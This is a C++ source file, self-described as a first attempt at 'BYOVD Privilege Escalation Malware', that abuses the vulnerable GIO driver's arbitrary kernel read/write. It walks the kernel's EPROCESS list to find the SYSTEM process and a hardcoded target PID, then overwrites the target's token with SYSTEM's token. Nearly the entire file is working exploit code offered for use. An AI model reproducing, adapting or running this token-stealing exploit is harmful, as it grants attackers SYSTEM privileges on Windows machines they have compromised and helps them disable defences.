// First try of creating a BYOVD malware - target GIO
//

#include <stdlib.h>

#include "driverOps.h"
#include "myIO.hpp"
#include "NT_Definitions.h"


#define PATH_TO_DRIVER L"\\\\.\\GIO"

void print_banner() {
    std::string S = R"(
    _____  ______ _   _____               
   / _ ) \/ / __ \ | / / _ \              
  / _  |\  / /_/ / |/ / // /              
 /____/ /_/\____/|___/____/     
    ___      _      _ __
   / _ \____(_)  __(_) /__ ___ ____       
  / ___/ __/ / |/ / / / -_) _ `/ -_)      
 /_/  /_/ /_/|___/_/_/\__/\_, /\__/       
    ____             __  /___/  _         
   / __/__ _______ _/ /__ _/ /_(_)__  ___ 
  / _/(_-</ __/ _ `/ / _ `/ __/ / _ \/ _ \
 /___/___/\__/\_,_/_/\_,_/\__/_/\___/_//_/
                                          
)";
    
    std::cout << S << std::endl;
    std::cout << "BYOVD Privilege Escalation Malware by MM\n" << std::endl;
}

bool EnablePrivilege(PCWSTR name) 
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
        return false;

    LUID luid;
    bool result = false;
    if (LookupPrivilegeValue(nullptr, name, &luid)){
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr)) {
            result = GetLastError() == ERROR_SUCCESS;
        }
    }

    CloseHandle(hToken);
    return result;
}

int getEPROCESSES(_In_ DriverOps * driver, _Out_ DWORD64* systemProcess, _Out_ DWORD64* targetProcess, _In_ const PVOID ImageBase, _In_ const ULONG64 targetPID)
{
    KernelReadWrite krw = { 0 };

    DWORD64 currentProcess = 0;
    krw.src = (LPVOID)((ULONG64)ImageBase + g_offsets.PsInitialSystemProcess);
    krw.dst = (LPVOID)(&currentProcess);
    krw.size = sizeof(DWORD64);
    if(!driver->arbitraryRW(&krw)) {
        return 3;
    }

    DWORD64 currentProcessListAddress = currentProcess + g_offsets.ActiveProcessLinks;
    DWORD64 HeadListAddress = currentProcessListAddress;

    int safety_couter = 0;
    bool systemProcessAchieved = FALSE;
    bool targetProcessAchieved = FALSE;

    while(1)
    {
        ULONG64 PID = 0;
        krw.src = (LPVOID)(currentProcess + g_offsets.UniqueProcessId);
        krw.dst = (LPVOID)(&PID);
        krw.size = sizeof(ULONG64);
        if (!driver->arbitraryRW(&krw)) {
            return 3;
        }

        if (PID == 4) {
            *systemProcess = currentProcess;
            systemProcessAchieved = TRUE;
        }
        else if (PID == targetPID) {
            *targetProcess = currentProcess;
            targetProcessAchieved = TRUE;
        }


        _LIST_ENTRY activeProcessLinks;
        krw.src = (LPVOID)currentProcessListAddress;
        krw.dst = (LPVOID)(&activeProcessLinks);
        krw.size = sizeof(_LIST_ENTRY);
        if(!driver->arbitraryRW(&krw)) {
            return 3;
        }

        DWORD64 nextAPLAddress = (DWORD64)activeProcessLinks.Flink;
        DWORD64 nextProcess = nextAPLAddress - g_offsets.ActiveProcessLinks;

        currentProcess = nextProcess;
        currentProcessListAddress = nextAPLAddress;

        if (targetProcessAchieved && systemProcessAchieved) return 0;
        if (HeadListAddress == currentProcessListAddress)   return 1;
        if (safety_couter++ > 5000)                         return 2;
    }
}

bool stealToken(_In_ DriverOps* driver, _In_ DWORD64 systemProcess, _In_ DWORD64 targetProcess)
{
    KernelReadWrite krw = { 0 };
    krw.src = (LPVOID)(systemProcess + g_offsets.Token);
    krw.dst = (LPVOID)(targetProcess + g_offsets.Token);
    krw.size = sizeof(_EX_FAST_REF);
    return driver->arbitraryRW(&krw);
}

int main() {
    try {
        print_banner();

        print(OutputMode::_INFO, "Malware has started");

        if (!EnablePrivilege(SE_DEBUG_NAME)) {
            throw std::string{ "Can't enable SeDebugPrivilege!" };
        }
        print(OutputMode::_SUCCESS, "SeDebugPivilege enabled!");

        DriverOps driver{};
        if (driver.openDriver(PATH_TO_DRIVER) == NULL) {
            throw std::string{ "Cannot open driver!" };
        }
        print(OutputMode::_SUCCESS, "Opened and got a handle to vulnerable driver!");

        RTL_PROCESS_MODULE_INFORMATION ntoskrnlInfo = { 0 };

        if (int err_code = NTGetNtoskrnlInfo(&ntoskrnlInfo)) {
            throw std::string{ "Couldn't get ntoskrnl information! Error code: " } + std::to_string(err_code);
        }
        print(OutputMode::_SUCCESS, "Got ntoskrnl information!");
        std::cout << "Base Address: " << ntoskrnlInfo.ImageBase << std::endl;

        DWORD64 systemProcess;
        DWORD64 targetProcess;
        ULONG64 targetPID = 2992;

        if (int err_code = getEPROCESSES(&driver, &systemProcess, &targetProcess, ntoskrnlInfo.ImageBase, targetPID)) {
            throw std::string{ "Couldn't scrap EProcesses! Error code: " } + std::to_string(err_code);
        }
        print(OutputMode::_SUCCESS, "Got both EProcesses!");

        if (!stealToken(&driver, systemProcess, targetProcess)) {
            throw std::string{ "Couldn't copy token values to target" };
        }
        print(OutputMode::_SUCCESS, "Successfully copied token value to target!");

        print(OutputMode::_SUCCESS, "LPE Done!");

    }
    catch (std::string msg) {
        print(OutputMode::_ERROR, msg);
    }

    std::cout << std::endl << "Press any button to close the window..." << std::endl;
    getchar();
    return 0;
}


